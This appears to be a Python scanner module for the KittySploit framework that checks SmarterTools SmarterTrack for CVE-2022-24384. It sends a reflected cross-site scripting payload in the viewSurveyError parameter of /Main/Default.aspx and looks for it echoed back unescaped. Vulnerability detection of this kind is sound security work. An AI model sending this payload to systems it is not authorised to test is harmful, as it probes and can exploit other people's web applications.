#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross-site Scripting (XSS) vulnerability in SmarterTools SmarterTrack This issue affects: SmarterTools Smarter."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SmarterTools SmarterTrack - Cross-Site Scripting Detection',
        'description': 'Cross-site Scripting (XSS) vulnerability in SmarterTools SmarterTrack This issue affects: SmarterTools SmarterTrack 100.0.8019.14010.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'smartertrack', 'smartertools', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://csirt.divd.nl/CVE-2022-24384', 'https://csirt.divd.nl/DIVD-2021-00029'],
        'cve': 'CVE-2022-24384',
    }

    def run(self):
        path = '/Main/Default.aspx?viewSurveyError=Unknown+survey"><img%20src=x%20onerror=alert(document.domain)>'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"type":"error","text":"Unknown survey\\"><img src=x onerror=alert(document.domain)>"', 'smartertrack',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='SmarterTools SmarterTrack - Cross-Site Scripting detected', path=path)
            return True
        return False

